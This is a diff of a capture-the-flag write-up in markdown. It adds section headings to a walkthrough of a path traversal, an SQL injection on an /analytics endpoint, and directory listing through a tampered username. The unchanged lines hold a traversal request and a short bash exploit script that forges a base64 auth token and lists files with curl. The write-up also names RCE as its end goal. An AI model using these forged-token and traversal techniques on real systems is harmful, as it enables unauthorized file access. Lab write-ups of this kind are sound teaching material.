@@ -20,6 +20,8 @@ GET /thumbnail?file=../../../../../../../tmp/foobar HTTP/1.1
 File doesn't exist
 ```
 
+## SQLi on /analytics endpoint
+
 We keep this information in mind for the moment: it will be useful later. The second thing that stands out are requests to an `/analytics` endpoint:
 
 ```
@@ -54,6 +56,9 @@ GET /account/files HTTP/1.1
 
 {"files":[{"link":"\/uploads\/bob.jones\/medical-report-to-complete.pdf","name":"medical-report-to-complete.pdf","extension":"pdf","size":60154}]}
 ```
+
+
+## Directory listing via username tampering
 
 Here we notice that we have "files" list where bob.jones, our username, is somehow involved in the path.
 
@@ -117,14 +122,12 @@ Interestingly enough we have a way to list directories.
 
 If you want to play around an alternative way is using a simple bash script:
 
-```bash
+```bash title="lfi-exploit.sh <domain> <path>"
 #!/bin/sh
-
 
 inside='{"id":2,"username":"'$2'"}'
 inside=$(/bin/echo -n $inside | base64)
 token=$(/bin/echo -n '{"auth":true,"data":"'$inside'"}' |base64)
-
 
 echo $token
 curl $1/account/files -H "Cookie: token=$token" | jq
@@ -132,6 +135,8 @@ curl $1/account/files -H "Cookie: token=$token" | jq  -r '.files[] |.link'
 ```
 
 For flag number 2 it's enough to list `../` to find a secret file.
+
+## Connecting the dots
 
 But now what? Remember that at this point we have three things that we have to put together to reach a much better result (RCE in the end):
 
